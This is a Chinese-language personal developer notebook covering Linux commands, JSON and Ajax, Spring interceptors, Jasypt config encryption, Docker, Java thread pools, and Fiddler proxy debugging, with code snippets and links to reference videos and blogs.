![image-20211120110005520](Akio's Book.assets/image-20211120110005520.png)





#### 11、文件系统、磁盘配额、备份（夹杂一点用户管理）

![image-20211120111603466](Akio's Book.assets/image-20211120111603466.png)

![image-20211120110205713](Akio's Book.assets/image-20211120110205713.png)

![image-20211120110255577](Akio's Book.assets/image-20211120110255577.png)

![image-20211120110341926](Akio's Book.assets/image-20211120110341926.png)





#### 12、shell程序

书接上集，其中包含精准检索awk，还有sed，sort，seq等

![image-20211120110416303](Akio's Book.assets/image-20211120110416303.png)

![image-20211120110437905](Akio's Book.assets/image-20211120110437905.png)

![image-20211120110510214](Akio's Book.assets/image-20211120110510214.png)

![image-20211120110626399](Akio's Book.assets/image-20211120110626399.png)

![image-20211120110722222](Akio's Book.assets/image-20211120110722222.png)

![image-20211120110758673](Akio's Book.assets/image-20211120110758673.png)

![image-20211120110821644](Akio's Book.assets/image-20211120110821644.png)





#### 13、查看软件安装目录

**linux查看redis安装目录**

1.在redis下查看安装目录

如果命令 which 和whereis 都找不到安装目录，可使用以下办法

```
ps -ef|grep redis
```

得到了进程号 xxxx

 然后 ls -l /proc/xxxx/cwd

![img](Akio's Book.assets/1016915-20190618141227160-1437324708.png)





#### 14、find详解

https://blog.csdn.net/xxmonstor/article/details/80507769



#### 15、tail详解

https://blog.csdn.net/weixin_44019406/article/details/102805197



#### 16、grep详解

https://blog.csdn.net/lijing742180/article/details/84959963





#### 17、linux的显示并保存

https://zhuanlan.zhihu.com/p/336943961

![image-20211201114941401](Akio's Book.assets/image-20211201114941401.png)





## JSON+Ajax

### JSON

参考视频
https://www.bilibili.com/video/BV1Pt411u7R3?from=search&seid=8214723860191678637&spm_id_from=333.337.0.0

参考文件
https://mp.weixin.qq.com/s/RAqRKZJqsJ78HRrJg71R1g

暂时比较常用的JSON依赖有两个Jackson和fastjson

> 什么是JSON？

- JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式，目前使用特别广泛。
- 采用完全独立于编程语言的**文本格式**来存储和表示数据。
- 简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。
- 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。

在 JavaScript 语言中，一切都是对象。因此，任何JavaScript 支持的类型都可以通过 JSON 来表示，例如字符串、数字、对象、数组等。看看他的要求和语法格式：

- 对象表示为键值对，数据由逗号分隔

- 花括号保存对象

- 方括号保存数组

  

**Jackson**

```xml
<!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core -->
<dependency>
   <groupId>com.fasterxml.jackson.core</groupId>
   <artifactId>jackson-databind</artifactId>
   <version>2.9.8</version>
</dependency>
```

```java
@RestController
public class UserController {
   //produces:指定响应体返回类型和编码，避免返回值出现乱码问题
   @GetMapping(value = "/json1",produces = "application/json;charset=utf-8")
   public String json1() throws JsonProcessingException {
       //创建一个jackson的对象映射器，用来解析数据
       ObjectMapper mapper = new ObjectMapper();
       //创建一个对象
       User user = new User("Grant", 3, "男");
       //将我们的对象解析成为json格式
       String str = mapper.writeValueAsString(user);
       //这里会将str转成json格式返回；十分方便
       return str;
  }
}
```



**fastjson**

```xml
<dependency>
   <groupId>com.alibaba</groupId>
   <artifactId>fastjson</artifactId>
   <version>1.2.60</version>
</dependency>
```

fastjson.jar是阿里开发的一款专门用于Java开发的包，可以方便的实现json对象与JavaBean对象的转换，实现JavaBean对象与json字符串的转换，实现json对象与json字符串的转换。

fastjson 有三个主要的类：

- **JSONObject  代表 json 对象** 

  - JSONObject实现了Map接口, 猜想 JSONObject底层操作是由Map实现的。

  - JSONObject对应json对象，通过各种形式的get()方法可以获取json对象中的数据，也可利用诸如size()，isEmpty()等方法获取"键：值"对的个数和判断是否为空。其本质是通过实现Map接口并调用接口中的方法完成的。

- **JSONArray  代表 json 对象数组**
  - 内部是有List接口中的方法来完成操作的。

- **JSON代表 JSONObject和JSONArray的转化**

  - JSON类源码分析与使用

  - 仔细观察这些方法，主要是实现json对象，json对象数组，javabean对象，json字符串之间的相互转化。

```java
package com.akio.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kuang.pojo.User;

import java.util.ArrayList;
import java.util.List;

public class FastJsonDemo {
   public static void main(String[] args) {
       //创建一个对象
       User user1 = new User("1号", 3, "男");
       User user2 = new User("2号", 3, "男");
       User user3 = new User("3号", 3, "男");
       User user4 = new User("4号", 3, "男");
       List<User> list = new ArrayList<User>();
       list.add(user1);
       list.add(user2);
       list.add(user3);
       list.add(user4);

       System.out.println("*******Java对象 转 JSON字符串*******");
       String str1 = JSON.toJSONString(list);
       System.out.println("JSON.toJSONString(list)==>"+str1);
       String str2 = JSON.toJSONString(user1);
       System.out.println("JSON.toJSONString(user1)==>"+str2);

       System.out.println("\n****** JSON字符串 转 Java对象*******");
       User jp_user1=JSON.parseObject(str2,User.class);//如果不加第二个参数就是JSON字符串转成JSON对象
       System.out.println("JSON.parseObject(str2,User.class)==>"+jp_user1);

       System.out.println("\n****** Java对象 转 JSON对象 ******");
       JSONObject jsonObject1 = (JSONObject) JSON.toJSON(user2);
       System.out.println("(JSONObject) JSON.toJSON(user2)==>"+jsonObject1.getString("name"));

       System.out.println("\n****** JSON对象 转 Java对象 ******");
       User to_java_user = JSON.toJavaObject(jsonObject1, User.class);
       System.out.println("JSON.toJavaObject(jsonObject1, User.class)==>"+to_java_user);
  }
}
```







### Ajax

参考视频
https://www.bilibili.com/video/BV1Kt411u7BV?spm_id_from=333.999.0.0

参考文章
https://mp.weixin.qq.com/s/tB4YX4H59wYS6rxaO3K2_g

> 简介

- **AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。**
- AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。
- **Ajax 不是一种新的编程语言，而是一种用于创建更好更快以及交互性更强的Web应用程序的技术。**
- 在 2005 年，Google 通过其 Google Suggest 使 AJAX 变得流行起来。Google Suggest能够自动帮你完成搜索单词。
- Google Suggest 使用 AJAX 创造出动态性极强的 web 界面：当您在谷歌的搜索框输入关键字时，JavaScript 会把这些字符发送到服务器，然后服务器会返回一个搜索建议的列表。
- 就和国内百度的搜索框一样!

- 传统的网页(即不用ajax技术的网页)，想要更新内容或者提交一个表单，都需要重新加载整个网页。

- 使用ajax技术的网页，通过在后台服务器进行少量的数据交换，就可以实现异步局部更新。

- 使用Ajax，用户可以创建接近本地桌面应用的直接、高可用、更丰富、更动态的Web用户界面。

  > 此处可以引申一下Axios和Ajax有什么区别https://blog.csdn.net/qq_42942555/article/details/88400721





## xml中书写sql

https://blog.csdn.net/duoen197231/article/details/52857443



## 微信登录

https://www.bilibili.com/video/BV1744y1y7iv?p=1	（主）

https://www.bilibili.com/video/BV17y4y1L78u?share_medium=android&share_plat=android&share_session_id=db6bbbae-71a2-4ff2-bc21-cf400090617a&share_source=COPY&share_tag=s_i&timestamp=1628985985&unique_k=Zm6VbX	（次）





## 拦截器

参考视频
https://www.bilibili.com/video/BV1Wq4y1L7hp?p=1
https://www.bilibili.com/video/BV1gK4y1x7Ww?spm_id_from=333.999.0.0

参考文献
https://www.cnblogs.com/black-spike/p/7813238.html

### 1.拦截器概述

#### 1.1 什么是拦截器？

Spring MVC中的拦截器（Interceptor）类似于Servlet中的过滤器（Filter），它主要用于拦截用户请求并作相应的处理。例如通过拦截器可以进行权限验证、记录请求信息的日志、判断用户是否登录等。
要使用Spring MVC中的拦截器，就需要对拦截器类进行定义和配置。通常拦截器类可以通过两种方式来定义。

```xml
1.通过实现HandlerInterceptor接口，或继承HandlerInterceptor接口的实现类（HandlerInterceptorAdapter）来定义。

2.通过实现WebRequestInterceptor接口，或继承WebRequestInterceptor接口的实现类来定义。
```

以实现HandlerInterceptor接口方式为例，自定义拦截器类的代码如下：

```java
public class CustomInterceptor implements HandlerInterceptor{
        public boolean preHandle(HttpServletRequest request, 
                                 HttpServletResponse response, Object handler)throws Exception {
            return false;
        }
        public void postHandle(HttpServletRequest request, 
                               HttpServletResponse response, Object handler,
                               ModelAndView modelAndView) throws Exception {
            
        }
        public void afterCompletion(HttpServletRequest request,
                                    HttpServletResponse response, Object handler,
                                    Exception ex) throws Exception {
        }
    }
```

上述代码中，自定义拦截器实现了HandlerInterceptor接口，并实现了接口中的三个方法：

- preHandle() 方法：该方法会在控制器方法前执行，其返回值表示是否中断后续操作。当其返回值为true时，表示继续向下执行；
  当其返回值为false时，会中断后续的所有操作（包括调用下一个拦截器和控制器类中的方法执行等）。
- postHandle()方法：该方法会在控制器方法调用之后，且解析视图之前执行。可以通过此方法对请求域中的模型和视图做出进一步的修改。
- afterCompletion()方法：该方法会在整个请求完成，即视图渲染结束之后执行。可以通过此方法实现一些资源清理、记录日志信息等工作。



#### 1.2 拦截器的配置

##### 传统xml方式配置拦截器

开发拦截器就像开发servlet或者filter一样，都需要在配置文件进行配置，配置代码如下：

```xml
<!--配置拦截器-->
    <mvc:interceptors>
        <!--<bean class="com.ma.interceptor.CustomeInterceptor" />-->
        <!--拦截器1-->
        <mvc:interceptor>
            <!--配置拦截器的作用路径-->
            <mvc:mapping path="/**"/>
            <mvc:exclude-mapping path=""/>
            <!--定义在<mvc:interceptor>下面的表示匹配指定路径的请求才进行拦截-->
            <bean class="com.ma.interceptor.Intercptor1"/>
        </mvc:interceptor>
        <!--拦截器2-->
        <mvc:interceptor>
            <mvc:mapping path="/hello"/>
            <bean class="com.ma.interceptor.Interceptor2"/>
        </mvc:interceptor>
```

上面的代码中，

`<mvc:interceptors>`素用于配置一组拦截器，基子元素<bean>中定义的是全局拦截器，它会拦截所有的请求；

而`<mvc:interceptor>`元素中定义的是指定路径的拦截器，它会对指定路径下的请求生效。

`<mvc:interceptor>`元素的子元素`<mvc:mapping>`用于配置拦截器作用的路径，该路径在其属性path 中定义。如上述代码中 path 的属性值“/”  表示拦截所有路径，“/hello” 表示拦截所有以 “/hello” 结尾的路径。如果在请求路径中包含不需要拦截的内容，还可以通过`<mvc:exclude-mapping>`元素进行配置。

**注意：`<mvc:interceptor>`中的子元素必须按照上述代码中的配置顺序进行编写，即`<mvc:mapping> <mvc:exclude-mapping><bean>`，否则文件会报错。**



##### Springboot中WebConfig中配置

![image-20211120212947378](Akio's Book.assets/image-20211120212947378.png)

```java
@Configuration
class WebMvcConfig implements WebMvcConfigurer {
    @Autowired
    private CustomHandlerInterceptor customHandlerInterceptor;//@

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        //拦截所有，除了exclude中的
        //registry.addInterceptor(customHandlerInterceptor).addPathPatterns("/**")//@
        registry.addInterceptor(getHandlerInterceptor()).addPathPatterns("/**")//#
                .excludePathPatterns(
                        "/**/login/**",
                        "/webjars/**",
                        "/error",
                        "/v2/**",
                        "/swagger-ui.html",
                        "/swagger-resources/**",
                        "/**/KoneService/**",
                        "/**/aligenie/**",
                        "/**/property/**",
                        "/**/equipmentTxt/**",
                        "/IUYJZxRk0N.txt"
                );
    }

    @Bean	//这里直接把拦截器当作bean注入进来		#
    public static CustomHandlerInterceptor getHandlerInterceptor() {
        return new CustomHandlerInterceptor();
    }
}
```







## AOP

### 日志







## git-stash

https://www.bilibili.com/video/BV1Df4y1S73d?from=search&seid=6949972506132106251&spm_id_from=333.337.0.0

https://blog.csdn.net/sinat_34937826/article/details/107316884

![image-20211122204429966](Akio's Book.assets/image-20211122204429966.png)

暂存更改，会将push之后操作的所有操作放入暂存区，并清空更改。多个分支暂存通用

Unstash使用更改

使用场景：提交暂存，然后将远程别人更新后的代码拉下来覆盖，再使用自己的暂存文件进行合并，然后提交更改push到远程。用于解决https://www.jianshu.com/p/14afc9916dcb









## WebSocket

https://www.ruanyifeng.com/blog/2017/05/websocket.html



## Java日期格式化（DateFormat类和SimpleDateFormat类）

http://c.biancheng.net/view/878.html





修改

```java
wechatusercontroller
    
    @PostMapping("/serviceProtocolVersion/{openid}/check")
    @ApiOperation("检查小程序用户服务协议版本是否最新")
    public JSONResult checkServiceProtocolVersion(@PathVariable String openid){
        JSONResult result = new JSONResult(JSONResult.OK);
        result.setData(weChatUserService.checkServiceProtocolVersion(openid));
        return result;
    }

    @PostMapping("/serviceProtocolVersion/{openid}/update")
    @ApiOperation("小程序用户同意服务协议后更新字段service_protocol_version为当前服务协议版本")
    public JSONResult updateServiceProtocolVersion(@PathVariable String openid) {
        return weChatUserService.updateServiceProtocolVersion(openid);
    }


/**
     * 作为判断方法
     * @param openid
     * @return
     */
    public Boolean checkServiceProtocolVersion(String openid){
        String serviceProtocolVersion = tUserMapper.getServiceProtocolVersion(openid);
        //该用户没有更新协议
        if (!ProtocolVersionConstant.service_protocol_version.getValue().equals(serviceProtocolVersion) || serviceProtocolVersion==""){
            return false;
        }
        return true;
    }



public JSONResult updateServiceProtocolVersion(String openid) {
        JSONResult result = new JSONResult(JSONResult.OK);
        Integer affectedRow = tUserMapper.updateServiceProtocolVersion(openid, ProtocolVersionConstant.service_protocol_version.getValue());
        if (affectedRow == 1){
            result.setData(true);
            return result;
        }
        result.setData(false);
        return result;
    }

@Select("select service_protocol_version from t_user_wechat where wechat_id=#{openid}")
    String getServiceProtocolVersion(String openid);


@Update("update t_user_wechat set service_protocol_version=#{serviceProtocolVersion} where wechat_id=#{openid}")
    Integer updateServiceProtocolVersion(String openid, String serviceProtocolVersion);




/**
     * 修改天猫精灵的呼叫类型，应该传入天猫精灵的id，即t_user_genie中的ali_genie_id字段
     * 天猫精灵是单一绑定？
     * 需不需要加一个用户的验证
     * @return
     */
    @PostMapping("/changeCallType")
    @ApiOperation("天猫精灵修改呼叫类型")
//    public JSONResult changeCallType(String deviceOpenId, String wechatOpenId) {
    public JSONResult changeCallType(String uuid) {
        //CustomBuildingDto
//        return aliGenieService.changeCallType(deviceOpenId, wechatOpenId);
        return aliGenieService.changeCallType(uuid);
    }


 /**
     * 根据t_user_genie中的id，修改呼叫状态
     * @param uuid
     * @return
     */
    public JSONResult changeCallType(String uuid) {
        JSONResult result = new JSONResult(JSONResult.OK);
        //根据uuid在t_user_genie表中查询对应的绑定记录
        String customBuildingId = aliGenieMapper.getCustomBuildingIdByUUid(uuid);
        if (StringUtil.isEmpty(customBuildingId)) {
            result.setData(false);
            return result;
        } else {
            Integer affectRow = aliGenieMapper.changeCallType(customBuildingId);
            if (affectRow != 1){
                result.setData(false);
                return result;
            }
            result.setData(true);
        }
        return result;
    }


    /**
     * Akio:
     * @param uuid
     * @return
     */
    @Select("select custom_building_id from t_user_genie where id=#{uuid} and status=1")
    String getCustomBuildingIdByUUid(String uuid);


 /**
     * Akio:改变呼叫类型，但需要注意精灵的开启状态 and genie_status=1是否有加入sql的必要
     * @param custombuildingId
     */
    @Update("update t_custom_building set call_type=\n" +
            "\tcase when call_type='0' then '1' when call_type='1' then '0' end where id=#{custombuildingId}")
    Integer changeCallType(String custombuildingId);
```







## SpringBoot项目敏感信息如何加密保护ENC加密

https://www.w3cschool.cn/article/57904429.html

https://www.bilibili.com/video/BV1xq4y167so?spm_id_from=333.999.0.0

- 导入此依赖

  ```xml
  <!-- https://mvnrepository.com/artifact/com.github.ulisesbocchio/jasypt-spring-boot-starter -->
  <dependency>
      <groupId>com.github.ulisesbocchio</groupId>
      <artifactId>jasypt-spring-boot-starter</artifactId>
      <version>3.0.3</version>
  </dependency>
  
  ```

- 在application.properties中配置文件中加盐，注意数据全部加密完成后，这个需要删除

  ```properties
  #加盐密码，解密的时候需要用到
  jasypt.encryptor.password=123
  ```

  如果没有这一步，后面的运行可能会出现如下错误

  ![image-20211202201610694](Akio's Book.assets/image-20211202201610694.png)

- 加密很简单

  ```java
  @SpringBootTest
  public class EncryptorTest {
      @Autowired
      private StringEncryptor stringEncryptor;
  
      @Test
      public void encryptorTest() {
          //加密
          String usernameEnc = stringEncryptor.encrypt("root");
          System.out.println("加密后的用户名:" + usernameEnc);
  
          //解密
          String usernameDec = stringEncryptor.decrypt(usernameEnc);
          System.out.println("解密后的用户名:" + usernameDec);
      }
  }
  ```

  ![image-20211202201842630](Akio's Book.assets/image-20211202201842630.png)

- 拿到加密后的数据放到application.properties文件中需要使用`ENC()`包裹

  ```properties
  spring.datasource.name=ENC(dWVwWQvdQahnO/WaSvT6bAqmLsoidd7lRMoA6G2nDLCh+vXFjKaeImnQjcPPYdrR)
  ```

- 在程序运行时使用他的时候，就需要我们的加盐密码去解密，这里我们运行启动的时候我们需要配置启动项。通过JVM参数传过去

  ![image-20211202202808621](Akio's Book.assets/image-20211202202808621.png)

  当然，如果我们部署运行的时候就直接`java -jar -Djasypt.encryptor.password=123 ..`启动程序





## docker

https://www.bilibili.com/video/BV1ug411j71W?from=search&seid=17010080874400657756&spm_id_from=333.337.0.0

### 简介

![image-20211202203842145](Akio's Book.assets/image-20211202203842145.png)

![image-20211202203900623](Akio's Book.assets/image-20211202203900623.png)

![image-20211202204012266](Akio's Book.assets/image-20211202204012266.png)

![image-20211202203954273](Akio's Book.assets/image-20211202203954273.png)



### docker背景

企业级开发中

<img src="Akio's Book.assets/image-20211202204519187.png" alt="image-20211202204519187" style="zoom:70%;" />

![image-20211202204822552](Akio's Book.assets/image-20211202204822552.png)

![image-20211202205014030](Akio's Book.assets/image-20211202205014030.png)

这么多情况的解决方案就是docker



### docker介绍

![image-20211202205234513](Akio's Book.assets/image-20211202205234513.png)

![image-20211202205313235](Akio's Book.assets/image-20211202205313235.png)

![image-20211202205742575](Akio's Book.assets/image-20211202205742575.png)

![image-20211202205953409](Akio's Book.assets/image-20211202205953409.png)



### docker基本概念

docker包括三个基本概念

- 镜像（Image）
- 容器（Container）
- 仓库（Repository）

理解了这三个概念，就理解了Docker的整个生命周期



### docker仓库

Docker仓库用于保存镜像，可以理解为代码控制中的代码仓库

Docker Hub(https://hub.docker.com)提供了庞大的镜像集合供使用



### docker纪要

 [docker1-基础.pdf](Akio's Book.assets\docker\docker1-基础.pdf) 

 [docker2-安装.pdf](Akio's Book.assets\docker\docker2-安装.pdf) 

 [docker3-高级-Dockerfile.pdf](Akio's Book.assets\docker\docker3-高级-Dockerfile.pdf)  

[docker4-仓库.pdf](Akio's Book.assets\docker\docker4-仓库.pdf) 

 [docker5-idea整合 -CA认证.pdf](Akio's Book.assets\docker\docker5-idea整合 -CA认证.pdf) 

 [docker6-图形化工具.pdf](Akio's Book.assets\docker\docker6-图形化工具.pdf) 

 [docker7-Docker-Compose.pdf](Akio's Book.assets\docker\docker7-Docker-Compose.pdf) 

 [docker8-持续集成与持续交付.pdf](Akio's Book.assets\docker\docker8-持续集成与持续交付.pdf) 









## 数据库

 `order BY substring_index( area_id,':', -1) + 0  ASC`

![image-20211207155708488](Akio's Book.assets/image-20211207155708488.png)

https://www.cnblogs.com/QFKing/p/11924380.html







## 注解的开发







## 线程池

### 线程

https://www.twle.cn/c/yufei/javatm/javatm-basic-future.html

https://www.cnblogs.com/westlife-11358/p/10469304.html



参考视频：

https://www.bilibili.com/video/BV1dt4y1i7Gt?from=search&seid=14716473568925631421&spm_id_from=333.337.0.0	用于快速上手

https://www.bilibili.com/video/BV1u7411t7G1?from=search&seid=14716473568925631421&spm_id_from=333.337.0.0

https://www.bilibili.com/video/BV1YN411o7Lz?from=search&seid=1352471604802547590&spm_id_from=333.337.0.0

https://www.bilibili.com/video/BV1ca4y1L7AU?from=search&seid=7037375791473409437&spm_id_from=333.337.0.0

参考博客：

https://cloud.tencent.com/developer/article/1893803

https://blog.csdn.net/weixin_49343190/article/details/115249588

https://blog.csdn.net/qq_20009015/article/details/85953364  包含介绍无界/有界任务队列，直接提交队列

### 线程池

池化思想：线程池、字符串常量池、数据库连接池
提高资源的利用率

没有线程池之前：1、手动创建线程任务 2、执行任务 3、执行完毕，释放线程对象

线程池优点：

- 提高线程的利用率
- 提高程序的响应速度
- 便于同于管理线程对象
- 可以控制最大并发数



### 几种线程池

以下的几种线程池均调用了方法

```java
public ThreadPoolExecutor(int corePoolSize,
                              int maximumPoolSize,
                              long keepAliveTime,
                              TimeUnit unit,
                              BlockingQueue<Runnable> workQueue) {
        this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,
             Executors.defaultThreadFactory(), defaultHandler);
    }
```

- **带缓存线程池**

  > 使用方法 `ExecutorService executorService = Executors.newCachedThreadPool();`
  >
  > 方法详情
  >
  > ```java
  > public static ExecutorService newCachedThreadPool() {
  >     return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
  >                                   60L, TimeUnit.SECONDS,
  >                                   new SynchronousQueue<Runnable>());
  > }
  > ```

  > 特点：
  >
  > - 核心线程数为0，所有线程都是临时线程，线程可重复利用
  > - 最大线程数为`Integer.MAX_VALUE` ，表示 Java 中的最大整数，意味着线程可以无限创建
  > - 临时线程的最大空闲时间是60s
  > - 任务队列（阻塞队列）的方式为没有容量，来一个任务使用一个线程执行它，任务不会等待
  > - 适合任务数密集，但每个任务执行时间较短的情况
  > - 由于每个线程执行完之后会归还池中，在空闲时间内还可以执行其余任务，故起名为带缓存

- **固定大小线程池**

  > 使用方法`ExecutorService fixedThreadPool = Executors.newFixedThreadPool(n);`
  >
  > - 参数指定 核心线程数 和 最大线程数 的大小
  >
  > 方法详情：
  >
  > ```java
  > public static ExecutorService newFixedThreadPool(int nThreads) {
  >     return new ThreadPoolExecutor(nThreads, nThreads,
  >                                   0L, TimeUnit.MILLISECONDS,
  >                                   new LinkedBlockingQueue<Runnable>());
  > }
  > ```
  >
  > 特点
  >
  > - 核心线程数 == 最大线程数，也就是说没有临时线程
  > - 无需设置临时线程的最大空闲时间
  > - 阻塞队列是无界的，可以存放任意数量的任务
  > - 适用于任务量已知，且相对耗时的任务（推荐使用）

- **单线程线程池**

  > 使用方法 `ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();`
  >
  > 方法详情
  >
  > ```java
  > public static ExecutorService newSingleThreadExecutor() {
  >     return new FinalizableDelegatedExecutorService
  >         (new ThreadPoolExecutor(1, 1,
  >                                 0L, TimeUnit.MILLISECONDS,
  >                                 new LinkedBlockingQueue<Runnable>()));
  > }
  > ```
  >
  > 特点
  >
  > - 核心线程数和最大线程数都是1，没有临时线程
  > - 无需设置临时线程的最大空闲时间
  > - 阻塞队列是无界的，可以存放任意数量的任务
  > - 适用于希望多个任务排队执行的情况
  >
  > 与自己定义一个线程执行任务的区别
  >
  > - 如果自定义的线程出现错误，则程序会终止，队列中的任务都无法执行；而线程池如果当前线程出现错误，还会新建一个线程，保证任务的正常执行

- **时间调度线程池**

  > 使用方法 `ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(n);`
  >
  > - 参数指定核心线程数
  >
  > 方法详情：
  >
  > ```java
  > public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) {
  >     return new ScheduledThreadPoolExecutor(corePoolSize);
  > }
  > 
  > //ScheduledThreadPoolExecutor继承了ThreadPoolExecutor
  > 
  > public ScheduledThreadPoolExecutor(int corePoolSize) {
  >     super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS,
  >           new DelayedWorkQueue());
  > }
  > ```
  >
  > 特点
  >
  > - 参数指定核心线程数
  > - 最大线程数为 “无限大”
  > - 阻塞队列的方式是具有延迟特性的无界阻塞队列
  > - 由于 `DelayedWorkQueue` 队列属于无界队列，故不会产生临时线程
  >
  > 使用情景1：`schedule` 方法
  >
  > ```java
  > ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(1);
  > 
  > //提交10个任务至线程池
  > for (int i = 0; i < 10; i++) {
  >     final int index = i;
  >     Runnable task = new Runnable() {
  >         public void run() {
  >             System.out.println(new Date().toString()
  >                   + " 第 " + (index + 1) + " 个任务延迟了 " + index + " 秒才运行");
  >         }
  >     };
  > 
  >     //第一个任务延迟1秒执行，第二个任务延迟2秒执行，第三个任务延迟3秒执行...
  >     //会立马将所有任务提交，主线程向下运行，提交之后到底什么时候执行，取决于设定值
  >     ScheduledFuture<?> schedule = scheduledThreadPool.schedule(task, i, TimeUnit.SECONDS);
  > }
  > 
  > //ScheduledExecutorService继承ExecutorService，故可调用父接口方法
  > //执行完所有任务后，关闭线程池
  > scheduledThreadPool.shutdown();
  > ```
  >
  > ![img](Akio's Book.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80OTM0MzE5MA==,size_16,color_FFFFFF,t_70.png)
  >
  > 使用情景2：`scheduleAtFixedRate` 方法
  >
  > ```java
  > ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);
  > 
  > //创建任务，每隔一秒执行一次，但每次任务执行时间需要三秒
  > Runnable task = new Runnable() {
  >     public void run() {
  >         try {
  >             System.out.println(new Date().toString() + " " +
  >                                Thread.currentThread().getName() + " 任务执行了！");
  >             Thread.sleep(3000);
  >         } catch (InterruptedException e) {
  >             e.printStackTrace();
  >         }
  >     }
  > };
  > scheduledThreadPool.scheduleAtFixedRate(task, 0, 1, TimeUnit.SECONDS);
  > ```
  >
  > ![img](Akio's Book.assets/20210326163016923.png)
  >
  > 任务的执行时间超过了任务的间隔时间，下一次任务达到了间隔时间准备执行时，发现上一次任务还没有结束，必须等待，当上一次任务执行结束之后，立即启动处于等待状态的下一次任务，所以没有按照设定的间隔时间执行任务
  >
  > 使用情景3：`scheduleWithFixedDelay` 方法
  >
  > ```java
  > ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);
  > 
  > //创建任务，一个任务要执行2秒，执行完成之后，再等待1秒开启下一个任务
  > Runnable task = new Runnable() {
  >     public void run() {
  >         try {
  >             System.out.println(new Date().toString() + " " +
  >                                Thread.currentThread().getName() + " 任务执行了！");
  >             Thread.sleep(2000);
  >         } catch (InterruptedException e) {
  >             e.printStackTrace();
  >         }
  >     }
  > };
  > scheduledThreadPool.scheduleWithFixedDelay(task, 0, 1, TimeUnit.SECONDS);
  > ```
  >
  > ![img](Akio's Book.assets/20210326163027973.png)





### 提交优先级和执行优先级



## 监测线程池的一种使用情况

https://www.hippox.cn/







## POSTMAN批量发送请求

https://www.cnblogs.com/l0923/p/13419986.html

https://blog.csdn.net/enthan809882/article/details/105163200?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link





## Fiddler

https://blog.csdn.net/ychgyyn/article/details/82154433	安卓手机抓包

### 1、Fiddler简介

> Fiddler是位于客户端和服务器之间的http代理
>
> 测试工作当中：
> Fiddler用于接口测试和接口调试，线上环境调试，判断前后端的bug等
>
> ![image-20211227154901430](Akio's Book.assets/image-20211227154901430.png)
>
> 安装Fiddler需要安装两个东西，一个Fiddler，一个Fiddler证书生成器
>
> http://www.telerik.com/fiddler
>
> http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2
>
> 多余补充： https://blog.csdn.net/u011304490/article/details/80058951
>
> https://blog.csdn.net/ychgyyn/article/details/82154433	安装证书
>
> ![image-20211227155100503](Akio's Book.assets/image-20211227155100503.png)
>
> 安装证书后，即可抓取到https请求



### 2、Fiddler使用注意

> 没有开启Fiddler的时候，我们打开浏览器的代理，会显示没有代理，此时的浏览器和服务器之间就是直接交互，不通过代理
>
> <img src="Akio's Book.assets/image-20211227160333086.png" alt="image-20211227160333086" style="zoom:50%;" /><img src="Akio's Book.assets/image-20211227160912495.png" alt="image-20211227160912495" style="zoom:50%;" />
>
> 但当我们将Fiddler打开的时候，代理就有了。Fiddler就是通过127.0.0.1的8888端口进行操作
>
> <img src="Akio's Book.assets/image-20211227160955950.png" alt="image-20211227160955950" style="zoom:50%;" />
>
> 然后我们通过浏览器进行访问，Fiddler中就会出现对应的请求数据包。其中有些请求数据包是上锁的，这是构建代理链接之间的通道包，我们不需要管他，可以使用Rules->Hide CONNECTs进行关闭。但关闭后我们会发现，访问baidu竟然抓不到包了，这是因为https请求是默认抓不到的
>
> <img src="Akio's Book.assets/image-20211227161315093.png" alt="image-20211227161315093" style="zoom:50%;" />



### 3、Fiddler功能页签

> ![image-20211227203455033](Akio's Book.assets/image-20211227203455033.png)
>
> **Inspectors 检查**
> 一般用于检查数据报文的信息
>
> ![image-20211227203934873](Akio's Book.assets/image-20211227203934873.png)
>
> 
>
> **AutoResponder自动化响应**
> 一般用于线上调试或者接口调试
>
> 当我的项目已经上线，但是发现页面中有一个样式需要修改，这时候一般的情况就是先要找运维，然后开发，然后重新上线。这个时候我们可以采用自动化响应，将请求的这个地址的文件替换成自己本地的，先看看效果。
>
> ![image-20211227212020040](Akio's Book.assets/image-20211227212020040.png)
>
> 替换的新文件的内容是这个页面你做了修改之后的页面文件。
>
> 
>
> **Composer接口测试**
>
> 这个功能很像postman的接口测试，下面这个请求发送了，可以在Inspectors中查看响应结果
>
> ![image-20211227210329616](Akio's Book.assets/image-20211227210329616.png)
>
> 同时，我们可以结合断点来调试或者携带参数发送请求，你可以在相应的之前或之后添加断点
>
> <img src="Akio's Book.assets/image-20211227210655090.png" alt="image-20211227210655090" style="zoom:70%;" />
>
> 如果是在响应之后加断点，我们就可以修改响应得到的数据
>
> ![image-20211227210951923](Akio's Book.assets/image-20211227210951923.png)
>
> 如果是在响应之前加断点，我们可以携带参数。如下这个链接就是请求数据，但需要传入page和count
>
> <img src="Akio's Book.assets/image-20211227211302085.png" alt="image-20211227211302085" style="zoom:80%;" />
>
> ![image-20211227211352025](Akio's Book.assets/image-20211227211352025-16406108328551.png)
>
> 
>
> 
>
> **Filters过滤器**
>
> 当我们请求产生大量数据的时候，不利于我们去抓包，所以我们可以使用到过滤器，过滤出我们所需要的一些数据包。
>
> 比如，我们要过滤留下请求http://47.107.116.139/的数据包
>
